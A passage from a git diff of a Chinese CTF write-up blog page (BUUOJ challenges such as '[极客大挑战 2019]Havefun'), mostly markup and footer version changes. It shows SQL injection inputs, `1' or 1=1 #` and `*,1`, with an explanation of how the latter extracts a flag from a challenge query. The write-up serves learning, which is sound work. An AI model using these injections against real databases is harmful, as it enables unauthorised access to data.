+</span></span></span><span class="line"><span class="cl"><span class="s1">1&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="c1">#
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="0x03-极客大挑战-2019havefun">0x03 [极客大挑战 2019]Havefun</h2>
 <p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Havefun" target="_blank" rel="noopener noreffer">题目链接</a></p>
@@ -604,8 +604,8 @@ array(2) {
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span><span class="w"> </span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">Flag</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">Flag</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>于是，可以输入<code>*,1</code>，使得被执行的查询语句为<code>select *,1||flag from Flag</code>，也就是<code>select *,1 from flag</code>。从而获取flag内容。</p>
 <p>收获：注入的时候要先尝试带和不带<code>'</code>的输入，判断是<strong>数字型</strong>还是<strong>字符型</strong>注入。</p>
@@ -790,8 +790,8 @@ array(2) {
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
         </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.93.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div></footer></div>
 
     <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
